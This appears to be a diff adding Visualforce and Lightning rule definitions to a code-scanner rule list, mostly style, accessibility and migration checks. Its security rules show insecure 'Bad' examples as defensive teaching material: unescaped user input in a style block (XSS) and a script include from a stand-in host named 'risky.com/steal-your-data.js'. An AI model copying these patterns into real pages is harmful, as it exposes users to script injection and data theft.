+  <li> <a href=""https://developer.salesforce.com/docs/atlas.en-us.pages.meta/pages/pages_security_tips_scontrols.htm"">Unescaped Output and Formulas in Visualforce Pages</a></li>
+  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
+  ('Eval Injection') </li>
+  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
+  ('Unsafe Reflection') </li>
+  <li> OWASP Top 10 2021 Category A03 - Injection </li>
+  
+</ul>
+
+
+      <BR><h2>Example:</h2><pre>
+
+&lt;style&gt;
+	  .xyz {
+	    color: #{!$CurrentPage.parameters.userInput}; //Bad: This is vulnerable to XSS.
+	  }
+&lt;/style&gt;
+
+&lt;style&gt;
+	  .xyz {
+	    color: #{!JSENCODE($CurrentPage.parameters.userInput)}; //Good: This is encoded with JSENCODE.
+	  }
+&lt;/style&gt;
+
+    </pre>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
+vf:AvoidExternalResources,External Script and Style Resources Should Be Avoided,"Including content from untrusted sources can lead to various security issues including include injection of malware,
+		information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware.<BR/>
+		<BR/>
+		All script and style resources must be loaded via static resources.<BR/>
+		Do not load these resources via script tags or links. <BR/>
+
+<h2>See</h2>		
+<ul>
+  <li> <a href=""http://cwe.mitre.org/data/definitions/829"">MITRE, CWE-829</a> - Inclusion of Functionality from Untrusted Control Sphere </li>
+  <li> OWASP Top 10 2021 Category A3 - Injection </li>
+  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
+</ul>
+    <BR><h2>Example:</h2><pre>
+	
+&lt;aura:component&gt;
+
+  &lt;ltng:require 
+    styles=""https://blah.com/css""    //Bad: This is not recommended.
+    scripts=""{!$Resource.example_js}""  //Good: Uses a static resource.
+    afterScriptsLoaded=""{!c.scriptsLoaded}"" /&gt;
+    
+&lt;/aura:component&gt;
+
+&lt;apex:page&gt;
+
+  &lt;apex:includeScript value=""http://risky.com/steal-your-data.js""/&gt; //Bad: This is not recommended.
+  &lt;apex:stylesheet value=""http://good.good.styles.com/css"" /&gt;  //Bad: This is not recommended.
+
+  &lt;apex:includeScript value=""{!$Resource.example_js}""/&gt;    //Good: Uses a static resource.
+  &lt;apex:stylesheet value=""{!$Resource.customCSS}"" /&gt;      //Good: Uses a static resource.
+  
+&lt;/apex:page&gt;
+
+
+
+
+
+    </pre>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
+cs-vf:secure-document,validate document global access,"<p>This rule makes sure that only supported properties and functions are used to access the document global.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>When the rule is enabled, unsupported calls or API objects are disallowed.  Your Lightning components are permitted to use:</p>
+<ul>
+<li>Standard Lightning Component Framework features.</li>
+<li>Standard Javascript features.</li>
+<li>Standard Locker Service SecureObject object features. </li>
+</ul>
+<p>All disallowed uses are shown in red on this <a href=""http://documentation.auraframework.org/lockerApiTest/index.app?aura.mode=DEV"">Document vs SecureDocument Compatibility Table</a>.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">var curScriptElement = document.currentScript; //Using document.currentScript is disallowed.
+</code></pre>",BLOCKER,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-extend-native,disallow extending native types,"<p>In JavaScript, you can extend any object, including builtin or ""native"" objects. Sometimes people change the behavior of these native objects in ways that break the assumptions made about them in other parts of the code.</p>
+<p>For example here we are overriding a builtin method that will then affect all Objects, even other builtins.</p>
+<pre><code class=""js language-js"">// seems harmless
+Object.prototype.extra = 55;
+
+// loop through some userIds
+var users = {
+    ""123"": ""Stan"",
+    ""456"": ""David""
+};
+
+// not what you'd expect
+for (var id in users) {
+    console.log(id); // ""123"", ""456"", ""extra""
+}
+</code></pre>
+<p>A common suggestion to avoid this problem would be to wrap the inside of the <code>for</code> loop with <code>users.hasOwnProperty(id)</code>. However, if this rule is strictly enforced throughout your codebase you won't need to take that step.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>Disallows directly modifying the prototype of builtin objects.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-extend-native: ""error""*/
+
+Object.prototype.a = ""a"";
+Object.defineProperty(Array.prototype, ""times"", { value: 999 });
+</code></pre>
+<h2 id=""options"">Options</h2>
+<p>This rule accepts an <code>exceptions</code> option, which can be used to specify a list of builtins for which extensions will be allowed.</p>
+<h3 id=""exceptions"">exceptions</h3>
+<p>Examples of <strong>correct</strong> code for the sample <code>{ ""exceptions"": [""Object""] }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-extend-native: [""error"", { ""exceptions"": [""Object""] }]*/
+
+Object.prototype.a = ""a"";
+</code></pre>
+<h2 id=""knownlimitations"">Known Limitations</h2>
+<p>This rule <em>does not</em> report any of the following less obvious approaches to modify the prototype of builtin objects:</p>
+<pre><code class=""js language-js"">var x = Object;
+x.prototype.thing = a;
+
+eval(""Array.prototype.forEach = 'muhahaha'"");
+
+with(Array) {
+    prototype.thing = 'thing';
+};
+
+window.Function.prototype.bind = 'tight';
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>You may want to disable this rule when working with polyfills that try to patch older versions of JavaScript with the latest spec, such as those that might <code>Function.prototype.bind</code> or <code>Array.prototype.forEach</code> in a future-friendly way.</p>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+cs-vf:no-catch-shadow,disallow `catch` clause parameters from shadowing variables in the outer scope,"<p>In IE 8 and earlier, the catch clause parameter can overwrite the value of a variable in the outer scope, if that variable has the same name as the catch clause parameter.</p>
+<pre><code class=""js language-js"">var err = ""x"";
+
+try {
+    throw ""problem"";
+} catch (err) {
+
+}
+
+console.log(err)    // err is 'problem', not 'x'
+</code></pre>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule is aimed at preventing unexpected behavior in your program that may arise from a bug in IE 8 and earlier, in which the catch clause parameter can leak into outer scopes. This rule will warn whenever it encounters a catch clause parameter that has the same name as a variable in an outer scope.</p>
+<p>Examples of <strong>incorrect</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-catch-shadow: ""error""*/
+
+var err = ""x"";
+
+try {
+    throw ""problem"";
+} catch (err) {
+
+}
+
+function err() {
+    // ...
+};
+
+try {
+    throw ""problem"";
+} catch (err) {
+
+}
+</code></pre>
+<p>Examples of <strong>correct</strong> code for this rule:</p>
+<pre><code class=""js language-js"">/*eslint no-catch-shadow: ""error""*/
+
+var err = ""x"";
+
+try {
+    throw ""problem"";
+} catch (e) {
+
+}
+
+function err() {
+    // ...
+};
+
+try {
+    throw ""problem"";
+} catch (e) {
+
+}
+</code></pre>
+<h2 id=""whennottouseit"">When Not To Use It</h2>
+<p>If you do not need to support IE 8 and earlier, you should turn this rule off.</p>",MAJOR,Visual Force & Lightning,BUG,FALSE
+vf:BoldTagsCheck,"""strong"" Tags Should Be Used Instead of ""b""","<p>
+The &lt;strong&gt;/&lt;b&gt; tags have exactly the same effect in most web browsers, but there is a fundamental difference between them: &lt;strong&gt; has a semantic meaning whereas &lt;b&gt; only conveys styling information like CSS.
+</p>
+<p>
+When &lt;b&gt; can have simply no effect on a Palm device with limited display or when a screen reader software is used by a blind person, &lt;strong&gt; will:
+</p>
+
+<ul>
+  <li>Underline the characters on a Palm Pilot</li>
+  <li>Speak with lower tone when using a screen reader such as Jaws</li>
+  <li>And display the text bold in normal browsers</li>
+</ul>
+
+<p>Consequently:</p>
+
+<ul>
+  <li>in order to convey semantics, the &lt;b&gt; tags shall never be used,</li>
+  <li>in order to convey styling information, the &lt;b&gt; should be avoided and CSS should be used instead.</li>
+</ul>
+
+     
+
+<h2>Noncompliant Code Example</h2>
+
+<pre>
+&lt;i&gt;car&lt;/i&gt;                 //Bad: this is not recommended.
+&lt;b&gt;train&lt;/b&gt;               //Bad: this is not recommended.
+</pre>
+
+<h2>Compliant Solution</h2>
+
+<pre>
+&lt;em&gt;car&lt;/em&gt;               //Good: this is preferred.
+&lt;strong&gt;train&lt;/strong&gt;     //Good: this is preferred.
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:InlineStyleAttributesCheck,Avoid Inline CSS Style Attributes,"<p>
+This rule detects the usage of HTML ""style"" attributes to make sure that all CSS styles are defined in CSS classes.
+</p>
+
+     <BR><h2>Example:</h2><pre>
+
+ &lt;p style=""color: blue;"" &gt; //Bad: using inline style attributes is not recommended.
+
+ 	//content...
+
+ &lt;/p&gt;
+
+
+     </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:LightningEnhancedListCheck,Check for Lightning Migration Issues for apex:enhancedList,"This rule looks for apex:enhancedList usage which may no longer work in lightning.
+apex:enhancedList isn't supported in Lightning Experience.
+We recommend avoiding <apex:enhancedList> in Lightning Experience.
+
+See <a href=""https://resources.docs.salesforce.com/198/latest/en-us/sfdc/pdf/lex_considerations.pdf"">https://resources.docs.salesforce.com/198/latest/en-us/sfdc/pdf/lex_considerations.pdf</a>
+    <BR><h2>Example:</h2><pre>
+
+
+&lt;apex:page&gt;
+	&lt;apex:enhancedList&gt;&lt;/apex:enhancedList&gt; //Bad: not recommended.
+&lt;/apex:page&gt;
+
+
+
+
+    </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:RequireConfirmationToken,Require CSRF Protection On GET Requests,"Require CSRF protection on GET requests must be enabled from the Visual Force Page settings.<br/>
+<br/>
+<h2>See</h2>
+<ul>
+  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
+  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
+  <li> <a href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29"">OWASP: Cross-Site Request Forgery</a> </li>
+  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
+  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#SPRING_CSRF_PROTECTION_DISABLED"">SPRING_CSRF_PROTECTION_DISABLED</a> </li>
+  <li> <a href=""https://trailhead.salesforce.com/en/content/learn/modules/secdev_application_logic_vulnerabilities/secdev_app_logic_csrf"">Salesforce Trailhead: Prevent Cross-Site Request Forgery (CSRF)</a> </li>
+</ul>
+  <BR><h2>Example:</h2><pre>//This setting must be enabled while creating a Visualforce page in Setup. </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:LightningAvoidHardcodedSalesforceDomain,Check for Lightning Migration Issues for Salesforce.com and Force.com Links,"URL references might not work as expected if you decide to swap to My Domain or in Lightning Experience. 
+
+If you decide to use My Domain, you have to replace hard-coded references to your original URL with references to your new domain.
+
+Using something lie {! $Site.Domain } may work better. 
+
+
+See <a href=""https://resources.docs.salesforce.com/198/latest/en-us/sfdc/pdf/lex_considerations.pdf"">https://resources.docs.salesforce.com/198/latest/en-us/sfdc/pdf/lex_considerations.pdf</a>
+    <BR><h2>Example:</h2><pre>
+
+<apex:page>
+	<a href=""https://na1.salesforce.com/..."">link</a> //Bad: This is not recommended.
+	<a href=""https://{! $Site.Domain }/..."">link</a> //Good: This is preferred.
+</apex:page>
+
+
+
+    </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:AvoidHardCodedResourceReferences,Avoid Hard Coded Resource References,"This rule identifies files that have been referenced with a hard-coded path.  Best practise is to upload the files as a Static Resource.  
+  This allows referencing with $Resource.&lt;resource_name&gt;.  
+  
+  More information on Static resources is available here: <a href=""https://developer.salesforce.com/docs/atlas.en-us.pages.meta/pages/pages_resources.htm"">Using Static Resources</a>
+  <BR><h2>Example:</h2><pre>
+	&lt;apex:page&gt;
+		
+		&lt;apex:image url=""/resource/TestImage.png"" /&gt;   	//Bad: Path is hard-coded.
+	
+		&lt;apex:image url=""{!$Resource.TestImage}"" /&gt;		//Good: Static Resource referencing is used.
+		
+	&lt;/apex:page&gt;
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:ImgWithoutWidthOrHeightCheck,"Images Tags Should Always Have a ""width"" and a ""height"" Attribute","If the <code>width</code> and <code>height</code> attributes are set, the space required for the image is reserved immediately by the browser, even before it actually starts to load the image.
+Without those attributes, the page layout constantly changes as images are loaded until they are all loaded, which can disorient users.
+
+
+<p>The following code:</p>
+
+<pre>
+&lt;img src=""logo.png"" alt=""My Company"" /&gt;                           //Bad: this is not recommended.
+</pre>
+
+should be refactored into:
+
+<pre>
+&lt;img src=""logo.png"" alt=""My Company"" width=""100"" height=""50"" /&gt;   //Good: this is preferred.
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:AvoidDotNamespace,Avoid Using Dot Namespace,"Avoid using apex. Component notation for namespaces.
+   <BR><h2>Example:</h2><pre>
+	&lt;aura:application&gt;
+	  &lt;c.Lash_DemoLighting&gt;&lt;/c.Lash_DemoLighting&gt;   //Bad: This syntax is not recommended.
+   	
+	  &lt;c:Lash_DemoLighting/&gt;	//Good: This syntax is preferred.
+	
+	&lt;aura:application&gt;
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:AvoidMultipleForms,Avoid Multiple Forms,"Multiple forms increase a page's view state and is not recommended
+    <BR><h2>Example:</h2><pre>
+	
+
+&lt;apex:page&gt;
+  &lt;apex:form&gt;
+  &lt;/apex:form&gt;
+  &lt;apex:form&gt; 	//Bad: page should only have a single apex:form
+  &lt;/apex:form&gt;
+&lt;/apex:page&gt;
+
+
+
+
+    </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:UnsupportedTagsInHtml5Check,Tags No Longer Supported in HTML5 Should Not Be Used,"&lt;p&gt;
+The following tags are no longer supported in HTML5 and should not be used:
+&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&amp;lt;acronym&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;applet&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;basefont&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;big&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;center&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;dir&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;font&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;frame&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;frameset&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;isindex&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;noframes&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;strike&amp;gt;&lt;/li&gt;
+  &lt;li&gt;&amp;lt;tt&amp;gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+More information on deprecated tags is avaliable here - <a href=""https://www.tutorialspoint.com/html5/html5_deprecated_tags.htm"">https://www.tutorialspoint.com/html5/html5_deprecated_tags.htm</a>
+
+
+    <BR><h2>Example:</h2><pre>
+
+ &lt;apex:page&gt;
+  &lt;html&gt;
+
+    &lt;p&gt&lt;big&gt;This is big text&lt;/big&gt;&lt;/p&gt   //Bad: This is deprecated.
+
+    &lt;p id=""bigger""&gt;This is big text&lt;/p&gt;           //Good: The size of the text should now be specified in CSS.
+
+
+  &lt;/html&gt;
+&lt;/apex:page&gt;
+    </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:AvoidHtmlCommentCheck,Avoid HTML Comments,"Checks for occurrence of HTML comments on server side pages.<br/>
+HTML comments can be seen by the end user. Comments left behind by developers could include information that helps attackers.
+<br/>
+Salesforce doesn't display normal comments, but conditional comments are visible. See <a href=""https://developer.salesforce.com/docs/atlas.en-us.pages.meta/pages/pages_html_features_ie_conditional_comments.htm"">HTML Comments and IE Conditional Comments</a>
+<h2>See</h2>
+<ul>
+  <li> <a href=""http://cwe.mitre.org/data/definitions/615.html"">MITRE, CWE-615</a> - Information Exposure Through Comments </li>
+  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
+</ul>
+    <BR><h2>Example:</h2><pre>
+
+&lt;!-- 
+This is a header comment and can be ignored.
+--&gt;
+
+&lt;apex:page&gt;
+	//Page content.
+
+	&lt;!-- Comment --&gt;  	//Bad: Consider removing this comment.
+	
+&lt;/apex:page&gt;
+
+
+    </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:ImgWithoutAltCheck,"Images Tags Should Have an ""alt"" Attribute","<p>
+The <code>alt</code> attribute provides a textual alternative to an image.
+It is used whenever the actual image cannot be rendered.
+Common reasons for that include:
+</p>
+
+<ul>
+  <li>The image can no longer be found</li>
+  <li>Slow internet connections, while waiting for the image to download</li>
+  <li>Visually impaired users using a screen reader software</li>
+  <li>Images loading is disabled, e.g. to reduce data consumption on mobile phones</li>
+</ul>
+
+<p>The following code illustrates this rule:</p>
+
+
+
+  
+<pre>
+&lt;img src=""foo.png"" /&gt;                                           //Bad: this is not recommended.
+&lt;img src=""foo.png"" alt=""Some textual description of foo.png"" /&gt; //Good: this is preferred.",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:InlineStyleCheck,Avoid Inline CSS Styles,"The goal of this rule is to ban the usage of HTML ""style"" property to make sure that all CSS styles are defined in CSS classes.
+
+&lt;style&gt; tags can also be a weak point for HTML injection.
+
+""For &lt;style&gt; tags the CDATA (HTML 4) or raw text (HTML 5) context applies. In this mode, the parser
+searches for the closing script or style tag, and dispatches the contents of the string between these tags to the javascript or
+CSS parser. No HTML decoding occurs. This is because the HTML parser does not understand javascript or CSS; its parsing role is
+limited to determining the length of the string to pass to the JS or CSS parser.""
+
+More information at: <a href=""https://developer.salesforce.com/page/Secure_Coding_Cross_Site_Scripting"">https://developer.salesforce.com/page/Secure_Coding_Cross_Site_Scripting</a>
+
+     <BR><h2>Example:</h2><pre>
+
+ &lt;style&gt; //Bad: using the inline style property is not recommended.
+
+ 	//content...
+
+ &lt;/style&gt;
+
+
+     </pre>",MAJOR,Visual Force & Lightning,VULNERABILITY,FALSE
+vf:NonConsecutiveHeadingCheck,Avoid Non Consecutive Heading Tags,"<p>
+Heading tags are used by search engines and screen reader softwares to construct an outline of the page.
+Starting at <code>&lt;h1&gt;</code> and not skipping any level eases this automatic construction.
+</p>
+
+    
+
+<p>The following code:</p>
+
+<pre>
+&lt;h2&gt;My Title&lt;/h2&gt;     //Bad: h1 is not being used before h2.
+
+&lt;h3&gt;My Sub Title&lt;/h3&gt; //Good: h3 is being used after h2.
+</pre>
+
+<p>should be refactored into:</p>
+
+<pre>
+&lt;h1&gt;My Title&lt;/h1&gt;     //Good.
+
+&lt;h2&gt;My Sub Title&lt;/h2&gt; //Good.
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:MaxLineLengthCheck,Avoid Long Lines,"Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.
+    <BR><h2>Example:</h2><pre>
+		
+ &lt;apex:page&gt;
+  &lt;html&gt;
+    &lt;div class='foo'&gt;       //Bad: The line below is much too long. Consider breaking it up over multiple lines. 
+      &lt;p&gt;This may be a description on a page, html text or an element with a lot of attributes but having to scroll to the right a long way to find out what is going on is the worst&lt;/p&gt; 
+    &lt;/div&gt;
+  &lt;/html&gt;
+&lt;/apex:page&gt;
+    </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:AvoidHardCodedPageLink,Avoid Hard-Coded Page Links.,"Avoid hard-coded Page links, use correct page references.
+  <BR><h2>Example:</h2><pre>
+&lt;apex:page>
+	
+	&lt;apex:outputLink value=""/apex/otherpage.html"">   //Bad: Hard-coded page link.
+  		This is a link to another page.
+  	&lt;/apex:outputLink>
+  	
+  	&lt;apex:outputLink value=""{!$Page.otherPage}"">  //Good: This is recommended.
+  		This is a link to another page.
+  	&lt;/apex:outputLink>
+
+&lt;/apex:page>
+  </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:LightningPageCheck,Check for Lightning Migration Issues for apex:page attributes,"This rule looks for apex:page attributes usage which may no longer work in lightning.
+
+See <a href=""https://resources.docs.salesforce.com/198/latest/en-us/sfdc/pdf/lex_considerations.pdf"">https://resources.docs.salesforce.com/198/latest/en-us/sfdc/pdf/lex_considerations.pdf</a>
+    <BR><h2>Example:</h2><pre>
+
+
+&lt;apex:page showheader='false' sidebar='false' title='not supported'&gt; //Bad: not recommended.
+&lt;/apex:page&gt;
+
+
+
+
+    </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:InputImgWithoutWidthOrHeightCheck,"Image buttons should always have a ""width"" and a ""height"" attribute","If the <code>width</code> and <code>height</code> attributes are set, the space required for the image is reserved immediately by the browser, even before it actually starts to load the image.
+Without those attributes, the page layout constantly changes as images are loaded until they are all loaded, which can disorient users.
+
+  
+
+<p>The following code:</p>
+
+<pre>
+&lt;img src=""logo.png"" alt=""My Company"" /&gt;                           //Bad: this is not recommended.
+</pre>
+
+should be refactored into:
+
+<pre>
+&lt;img src=""logo.png"" alt=""My Company"" width=""100"" height=""50"" /&gt;   //Good: this is preferred.
+</pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:LightningIframeCheck,Check for Lightning Migration Issues for apex:iframe,"This rule looks for apex:iframe usage which may no longer work in lightning.
+Although apex:iframe is supported in Lightning Experience, we recommend avoiding it.
+Only use this component if you're comfortable working with iframes in JavaScript and understand how they affect the DOM. If you haven't worked with nested iframes before, you might run into problems that are difficult to debug.
+
+
+See <a href=""https://resources.docs.salesforce.com/198/latest/en-us/sfdc/pdf/lex_considerations.pdf"">https://resources.docs.salesforce.com/198/latest/en-us/sfdc/pdf/lex_considerations.pdf</a>
+    <BR><h2>Example:</h2><pre>
+
+
+&lt;apex:page&gt;
+	&lt;apex:iframe&gt;&lt;/apex:iframe&gt; //Bad: not recommended.
+&lt;/apex:page&gt;
+
+
+
+
+    </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+vf:AvoidLinkingToRecordIds,Check for Lightning Migration Issues for Hard Coded ID Links,"HREF may link directly to Salesforce record.  An anchor tag refers directly to a record ID on this page.
+Direct links to records aren't supported in Lightning Experience.
+To view, create, or edit records, use actions and functions rather than direct URLs. For example, use
+{!URLFOR($Action.Contact.Edit, recordId)}
+to edit a contact record in Visualforce markup, or navigateToSObject(recordId) in JavaScript.
+
+See <a href=""https://resources.docs.salesforce.com/198/latest/en-us/sfdc/pdf/lex_considerations.pdf"">https://resources.docs.salesforce.com/198/latest/en-us/sfdc/pdf/lex_considerations.pdf</a>
+    <BR><h2>Example:</h2><pre>
+
+
+&lt;a href=""/030000000123""&gtl;Click here&lt;/a&gt;
+
+
+
+
+    </pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+common-vf:InsufficientBranchCoverage,Branches should have sufficient coverage by tests,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+common-vf:InsufficientLineCoverage,Lines should have sufficient coverage by tests,An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.,MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+common-vf:InsufficientCommentDensity,Source files should have a sufficient density of comment lines,An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.,MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+common-vf:DuplicatedBlocks,Source files should not have any duplicated blocks,An issue is created on a file as soon as there is at least one block of duplicated code on this file,MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+common-vf:SkippedUnitTests,Skipped unit tests should be either removed or fixed,Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.,MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
+common-vf:FailedUnitTests,Failed unit tests should be fixed,Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.,MAJOR,Visual Force & Lightning,BUG,FALSE
+cs-vf:no-unused-expressions,disallow unused expressions,"<p>An unused expression which has no effect on the state of the program indicates a logic error.</p>
+<p>For example, <code>n + 1;</code> is not a syntax error, but it might be a typing mistake where a programmer meant an assignment statement <code>n += 1;</code> instead.</p>
+<h2 id=""ruledetails"">Rule Details</h2>
+<p>This rule aims to eliminate unused expressions which have no effect on the state of the program.</p>
+<p>This rule does not apply to function calls or constructor calls with the <code>new</code> operator, because they could have <em>side effects</em> on the state of the program.</p>
+<pre><code class=""js language-js"">var i = 0;
+function increment() { i += 1; }
+increment(); // return value is unused, but i changed as a side effect
+
+var nThings = 0;
+function Thing() { nThings += 1; }
+new Thing(); // constructed object is unused, but nThings changed as a side effect
+</code></pre>
+<p>This rule does not apply to directives (which are in the form of literal string expressions such as <code>""use strict"";</code> at the beginning of a script, module, or function).</p>
+<p>Sequence expressions (those using a comma, such as <code>a = 1, b = 2</code>) are always considered unused unless their return value is assigned or used in a condition evaluation, or a function call is made with the sequence expression value.</p>
+<h2 id=""options"">Options</h2>
+<p>This rule, in its default state, does not require any arguments. If you would like to enable one or more of the following you may pass an object with the options set as follows:</p>
+<ul>
+<li><code>allowShortCircuit</code> set to <code>true</code> will allow you to use short circuit evaluations in your expressions (Default: <code>false</code>).</li>
+<li><code>allowTernary</code> set to <code>true</code> will enable you to use ternary operators in your expressions similarly to short circuit evaluations (Default: <code>false</code>).</li>
+<li><code>allowTaggedTemplates</code> set to <code>true</code> will enable you to use tagged template literals in your expressions (Default: <code>false</code>).</li>
+</ul>
+<p>These options allow unused expressions <em>only if all</em> of the code paths either directly change the state (for example, assignment statement) or could have <em>side effects</em> (for example, function call).</p>
+<p>Examples of <strong>incorrect</strong> code for the default <code>{ ""allowShortCircuit"": false, ""allowTernary"": false }</code> options:</p>
+<pre><code class=""js language-js"">/*eslint no-unused-expressions: ""error""*/
+
+0
+
+if(0) 0
+
+{0}
+
+f(0), {}
+
+a &amp;&amp; b()
+
+a, b()
+
+c = a, b;
+
+a() &amp;&amp; function namedFunctionInExpressionContext () {f();}
+
+(function anIncompleteIIFE () {});
+
+injectGlobal`body{ color: red; }`
+</code></pre>
+<p>Note that one or more string expression statements (with or without semi-colons) will only be considered as unused if they are not in the beginning of a script, module, or function (alone and uninterrupted by other statements). Otherwise, they will be treated as part of a ""directive prologue"", a section potentially usable by JavaScript engines. This includes ""strict mode"" directives.</p>
+<pre><code class=""js language-js"">""use strict"";
+""use asm""
+""use stricter"";
+""use babel""
+""any other strings like this in the prologue"";
+</code></pre>
+<p>Examples of <strong>correct</strong> code for the default <code>{ ""allowShortCircuit"": false, ""allowTernary"": false }</code> options:</p>
+<pre><code class=""js language-js"">/*eslint no-unused-expressions: ""error""*/
+
+{} // In this context, this is a block statement, not an object literal
+
+{myLabel: someVar} // In this context, this is a block statement with a label and expression, not an object literal
+
+function namedFunctionDeclaration () {}
+
+(function aGenuineIIFE () {}());
+
+f()
+
+a = 0
+
+new C
+
+delete a.b
+
+void a
+</code></pre>
+<h3 id=""allowshortcircuit"">allowShortCircuit</h3>
+<p>Examples of <strong>incorrect</strong> code for the <code>{ ""allowShortCircuit"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-unused-expressions: [""error"", { ""allowShortCircuit"": true }]*/
+
+a || b
+</code></pre>
+<p>Examples of <strong>correct</strong> code for the <code>{ ""allowShortCircuit"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-unused-expressions: [""error"", { ""allowShortCircuit"": true }]*/
+
+a &amp;&amp; b()
+a() || (b = c)
+</code></pre>
+<h3 id=""allowternary"">allowTernary</h3>
+<p>Examples of <strong>incorrect</strong> code for the <code>{ ""allowTernary"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-unused-expressions: [""error"", { ""allowTernary"": true }]*/
+
+a ? b : 0
+a ? b : c()
+</code></pre>
+<p>Examples of <strong>correct</strong> code for the <code>{ ""allowTernary"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-unused-expressions: [""error"", { ""allowTernary"": true }]*/
+
+a ? b() : c()
+a ? (b = c) : d()
+</code></pre>
+<h3 id=""allowshortcircuitandallowternary"">allowShortCircuit and allowTernary</h3>
+<p>Examples of <strong>correct</strong> code for the <code>{ ""allowShortCircuit"": true, ""allowTernary"": true }</code> options:</p>
+<pre><code class=""js language-js"">/*eslint no-unused-expressions: [""error"", { ""allowShortCircuit"": true, ""allowTernary"": true }]*/
+
+a ? b() || (c = d) : e()
+</code></pre>
+<h3 id=""allowtaggedtemplates"">allowTaggedTemplates</h3>
+<p>Examples of <strong>incorrect</strong> code for the <code>{ ""allowTaggedTemplates"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-unused-expressions: [""error"", { ""allowTaggedTemplates"": true }]*/
+
+`some untagged template string`;
+</code></pre>
+<p>Examples of <strong>correct</strong> code for the <code>{ ""allowTaggedTemplates"": true }</code> option:</p>
+<pre><code class=""js language-js"">/*eslint no-unused-expressions: [""error"", { ""allowTaggedTemplates"": true }]*/
+
+tag`some tagged template string`;
+</code></pre>",MAJOR,Visual Force & Lightning,CODE_SMELL,FALSE
